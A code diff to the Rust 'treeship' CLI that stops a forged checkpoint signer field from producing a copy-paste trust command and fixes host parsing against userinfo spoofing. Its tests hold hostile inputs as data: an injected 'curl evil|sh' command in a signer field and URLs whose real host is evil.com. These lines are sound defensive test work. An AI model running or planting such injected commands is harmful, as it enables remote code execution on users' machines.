@@ -504,10 +504,7 @@ pub fn verify(
         // checkpoint itself, so the pin line is not a copy-paste that trusts
         // it blindly: no `--yes`, and the reader confirms the key elsewhere.
         let key_id = &proof_file.checkpoint.signer;
-        let pin = format!("treeship trust add {key_id} ed25519:{public_key} --kind hub_checkpoint");
-        let detail = format!(
-            "checkpoint signer {key_id} is not pinned here. Confirm this key out of band (from the hub operator or a source you trust), then: {pin}"
-        );
+        let detail = pin_advice(key_id, public_key);
         if printer.format == crate::printer::Format::Json {
             printer.json(&serde_json::json!({
                 "outcome": "not_pinned",
@@ -529,7 +526,7 @@ pub fn verify(
             );
         }
         return Err(crate::exit::not_pinned(format!(
-            "checkpoint signer {key_id} not pinned"
+            "checkpoint signer {key_id:?} not pinned"
         )));
     } else {
         let mut reasons = Vec::new();
@@ -789,6 +786,23 @@ pub fn publish(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn st
     Ok(())
 }
 
+/// What to tell a reader whose checkpoint signer is not pinned. Both values
+/// come from the checkpoint itself: the public key has already decoded as a
+/// 32-byte Ed25519 key (base64url), but `signer` is free text a self-signed
+/// forgery controls, so the copy-paste `trust add` line is printed only when
+/// it is a well-formed key id; anything else is quoted and gets no command.
+fn pin_advice(key_id: &str, public_key: &str) -> String {
+    if crate::commands::trust::looks_like_key_id(key_id) {
+        format!(
+            "checkpoint signer {key_id} is not pinned here. Confirm this key out of band (from the hub operator or a source you trust), then: treeship trust add {key_id} ed25519:{public_key} --kind hub_checkpoint"
+        )
+    } else {
+        format!(
+            "checkpoint signer {key_id:?} is not pinned here, and its signer field is not a key id, so no pin command is offered. Its public key is ed25519:{public_key}; confirm it out of band before trusting anything it signed"
+        )
+    }
+}
+
 /// Where the proof just published can be read. The hub serves it at
 /// `<endpoint>/v1/merkle/<artifact>`; only the hosted hub (`api.treeship.dev`)
 /// has the treeship.dev page. The URL comes from the attached endpoint, never
@@ -796,12 +810,18 @@ pub fn publish(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn st
 /// treeship.dev (W1-9, CLI-12).
 fn proof_share_url(endpoint: &str, artifact_id: &str) -> String {
     let base = endpoint.trim_end_matches('/');
-    let host = base
-        .split_once("://")
-        .map_or(base, |(_, rest)| rest)
-        .split(['/', ':'])
-        .next()
-        .unwrap_or("");
+    // The host of the authority: after the scheme, up to the first `/`, `?`
+    // or `#`; without any `user:pass@` (the part after the last `@`); without
+    // the port; without a trailing root dot. `https://api.treeship.dev:x@evil`
+    // is evil's host, not ours.
+    let after_scheme = base.split_once("://").map_or(base, |(_, rest)| rest);
+    let authority = after_scheme.split(['/', '?', '#']).next().unwrap_or("");
+    let hostport = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
+    let host = hostport
+        .rsplit_once(':')
+        .filter(|(_, port)| port.chars().all(|c| c.is_ascii_digit()))
+        .map_or(hostport, |(h, _)| h)
+        .trim_end_matches('.');
     if host.eq_ignore_ascii_case("api.treeship.dev") {
         format!("https://treeship.dev/merkle?id={artifact_id}")
     } else {
@@ -950,7 +970,7 @@ fn build_dpop_jwt(
 
 #[cfg(test)]
 mod publish_tests {
-    use super::{is_missing_hub_artifact, proof_share_url};
+    use super::{is_missing_hub_artifact, pin_advice, proof_share_url};
 
     #[test]
     fn proof_share_url_follows_the_attached_hub() {
@@ -979,6 +999,41 @@ mod publish_tests {
             proof_share_url("https://api.treeship.dev.evil.example", "art_1"),
             "https://api.treeship.dev.evil.example/v1/merkle/art_1"
         );
+        // userinfo is not the host: this URL's host is evil.com.
+        for evil in [
+            "https://api.treeship.dev:x@evil.com",
+            "https://api.treeship.dev@evil.com",
+            "https://user:pw@evil.com/?h=api.treeship.dev",
+        ] {
+            assert!(
+                !proof_share_url(evil, "art_1").starts_with("https://treeship.dev/"),
+                "{evil}"
+            );
+        }
+        // A trailing root dot and a query are still the hosted hub.
+        for hosted in ["https://api.treeship.dev./", "https://api.treeship.dev?x=1"] {
+            assert_eq!(
+                proof_share_url(hosted, "art_1"),
+                "https://treeship.dev/merkle?id=art_1",
+                "{hosted}"
+            );
+        }
+    }
+
+    #[test]
+    fn pin_advice_offers_a_command_only_for_a_key_id() {
+        let ok = pin_advice("key_0123456789abcdef", "AAAA");
+        assert!(
+            ok.contains(
+                "then: treeship trust add key_0123456789abcdef ed25519:AAAA --kind hub_checkpoint"
+            ),
+            "{ok}"
+        );
+        assert!(!ok.contains("--yes"), "{ok}");
+        // A self-signed forgery controls the signer field.
+        let evil = pin_advice("key_x; curl evil|sh", "AAAA");
+        assert!(!evil.contains("treeship trust add"), "{evil}");
+        assert!(evil.contains("\"key_x; curl evil|sh\""), "{evil}");
     }
 
     #[test]
